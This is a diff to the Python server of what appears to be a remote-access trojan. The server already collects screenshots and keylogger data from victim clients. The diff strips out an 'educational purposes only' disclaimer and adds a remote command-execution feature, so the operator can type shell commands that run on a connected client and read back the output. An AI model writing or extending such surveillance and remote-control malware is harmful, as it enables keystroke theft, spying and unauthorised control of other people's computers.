@@ -1,7 +1,3 @@
-'''
-Disclaimer: This code and software are provided for educational purposes only. The author and contributors disclaim any responsibility for misuse, harm, or damage caused by the use of this code. Use at your own risk and responsibility. This code should not be used for any malicious or unauthorized activities.
-'''
-
 import socket
 from PIL import Image
 import io
@@ -69,6 +65,16 @@ def save_keylogs(client_socket, client_address):
     else:
         print("Failed to receive complete key logs data.")
 
+def execute_command(client_socket, client_address):
+    try:
+        command = input("Enter the command to execute on the client: ")
+        client_socket.sendall(b"cmd")
+        client_socket.sendall(bytes(command, 'utf-8'))
+        output = client_socket.recv(4096).decode('utf-8')
+        print(f"Output from client: {output}")
+    except Exception as e:
+        print(f"Error occurred - {e}")
+
 def start_server(host, port):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind((host, port))
@@ -79,7 +85,7 @@ def start_server(host, port):
 
     try:
         while True:
-            command = input("Enter a command ('screenshot [ip]', 'logs [ip]', 'exit'): ")
+            command = input("Enter a command ('screenshot [ip]', 'cmd [ip]', 'logs [ip]', 'exit'): ")
 
             if command.startswith("screenshot"):
                 try:
@@ -91,7 +97,15 @@ def start_server(host, port):
                         print(f"Client with IP {ip} not found.")
                 except ValueError:
                     print("Please enter an IP address after 'screenshot' command.")
-
+            elif command.startswith("cmd"):
+                try:
+                    _, ip = command.split()
+                    if ip == client_address[0]:
+                        execute_command(client_socket, client_address)
+                    else:
+                        print(f"Client with IP {ip} not found.")
+                except ValueError:
+                    print("Please enter an IP address after 'cmd' command.")
             elif command.startswith("logs"):
                 try:
                     _, ip = command.split()
